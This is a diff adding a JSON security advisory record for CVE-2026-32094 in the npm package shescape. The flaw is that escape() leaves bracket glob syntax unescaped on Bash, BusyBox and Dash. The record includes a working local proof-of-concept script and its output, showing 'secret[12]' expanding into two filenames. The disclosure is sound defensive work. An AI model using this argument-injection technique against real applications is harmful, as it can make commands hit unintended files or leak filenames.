@@ -1,0 +1,62 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-03-11T19:53:56Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "shescape"
+  },
+  "Advisory": {
+    "DatabaseId": 342003,
+    "Id": "GSA_kwCzR0hTQS05amZoLTl4cnEtNHZ3bc4ABTfz",
+    "GhsaId": "GHSA-9jfh-9xrq-4vwm",
+    "References": [
+      {
+        "Url": "https://github.com/ericcornelissen/shescape/security/advisories/GHSA-9jfh-9xrq-4vwm"
+      },
+      {
+        "Url": "https://github.com/ericcornelissen/shescape/pull/2410"
+      },
+      {
+        "Url": "https://github.com/ericcornelissen/shescape/commit/6add105c6f6b508662bb5ae3b3bdd4c9bcebf37a"
+      },
+      {
+        "Url": "https://github.com/ericcornelissen/shescape/releases/tag/v2.1.10"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-32094"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-9jfh-9xrq-4vwm"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-9jfh-9xrq-4vwm"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-32094"
+      }
+    ],
+    "Description": "### Summary\n\n`Shescape#escape()` does not escape square-bracket glob syntax for Bash, BusyBox `sh`, and Dash. Applications that interpolate the return value directly into a shell command string can cause an attacker-controlled value like `secret[12]` to expand into multiple filesystem matches instead of a single literal argument, turning one argument into multiple trusted-pathname matches.\n\n### Details\n\nThe unquoted Unix escape helpers never add `[` or `]` to their “special characters” regexes:\n\n- `src/internal/unix/bash.js:14-30`\n- `src/internal/unix/busybox.js:14-30`\n- `src/internal/unix/dash.js:12-19`\n\nThey escape `*`/`?` but not brackets, so `new Shescape({ shell: \"/usr/bin/bash\" }).escape(\"secret[12]\")` still produces `secret[12]`. The fixtures (`test/fixtures/unix.js:2236-2265`, `3496-3525`, `5762-5792`) are currently written to expect literal brackets for these shells, confirming the behavior. The documentation recommends `Shescape#escape()` as the fallback for `exec` when quoting isn’t possible (`docs/recipes.md:154-183`).\n\n### Proof of Concept\n\nUse the published npm tarball without modifications:\n\n```shell\ntmp=$(mktemp -d)\ncd \"$tmp\"\nnpm pack shescape@2.1.9 \u003e/dev/null\nmkdir pkg\ntar -xzf shescape-2.1.9.tgz -C pkg\ncd pkg/package\nnpm install --omit=dev\n\nnode --input-type=module - \u003c\u003c'NODE'\nimport { mkdtempSync, writeFileSync } from \"node:fs\";\nimport { tmpdir } from \"node:os\";\nimport path from \"node:path\";\nimport { execSync } from \"node:child_process\";\nimport { Shescape } from \"./src/index.js\";\n\nconst dir = mkdtempSync(path.join(tmpdir(), \"shescape-ghsa-poc-\"));\nwriteFileSync(path.join(dir, \"secret1\"), \"\");\nwriteFileSync(path.join(dir, \"secret2\"), \"\");\n\nfor (const shell of [\"/usr/bin/bash\", \"/usr/bin/dash\"]) {\n  const shescape = new Shescape({ shell });\n  const escaped = shescape.escape(\"secret[12]\");\n  console.log(${shell} escaped=${escaped});\n  const out = execSync(printf '\u003c%s\u003e\\\\n' ${escaped}, { cwd: dir, shell }).toString();\n  process.stdout.write(out);\n}\nNODE\n```\n\nOutput:\n\n```text\n/usr/bin/bash escaped=secret[12]\n\u003csecret1\u003e\n\u003csecret2\u003e\n/usr/bin/dash escaped=secret[12]\n\u003csecret1\u003e\n\u003csecret2\u003e\n```\n\nExpected: the shell receives `secret\\[12\\]`, so only one literal argument runs.\n\n### Impact\n\nArgument injection: a single untrusted argument expands into multiple pathname matches from the trusted filesystem. This can change command behavior, target unintended files, or leak filenames. Any application calling `Shescape#escape()` with Bash/BusyBox/Dash shells and interpolating the result into a shell command string is affected.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-03-11T19:53:53Z",
+    "Severity": "MODERATE",
+    "Summary": "Shescape escape() leaves bracket glob expansion active on Bash, BusyBox, and Dash",
+    "UpdatedAt": "2026-03-11T21:38:11Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.1.10"
+      },
+      "VulnerableVersionRange": "\u003c 2.1.10"
+    }
+  ]
+}
